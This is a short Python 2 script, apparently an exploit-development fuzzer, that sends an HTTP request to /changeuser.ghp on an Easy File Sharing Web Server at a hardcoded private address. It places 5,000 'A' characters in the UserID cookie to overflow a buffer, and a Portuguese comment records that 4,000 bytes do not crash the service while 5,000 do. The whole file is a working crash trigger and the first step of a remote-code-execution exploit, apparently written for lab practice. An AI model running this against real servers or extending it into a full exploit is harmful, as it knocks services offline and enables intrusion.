#!/usr/bin/python

import sys, socket, struct
 

#if len(sys.argv) <= 1:
#    print "Usage: python efsws.py [host] [port]"
#    exit()
 
#host = sys.argv[1]    
#port = int(sys.argv[2])

host = "172.16.162.166"
port = 80

print "[+]Connecting to" + host

# 4000 nao quebra mas 5000 quebra
buffer =  "A"*5000


httpreq = (

"GET /changeuser.ghp HTTP/1.1\r\n"

"User-Agent: Mozilla/4.0\r\n"

"Host:" + host + ":" + str(port) + "\r\n"

"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

"Accept-Language: en-us\r\n"

"Accept-Encoding: gzip, deflate\r\n"

"Referer: http://" + host + "/\r\n"

"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"

"Conection: Keep-Alive\r\n\r\n"
)


print "[+] fuzzing the application with %s bytes" %len(buffer)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

s.send(httpreq)

s.close()
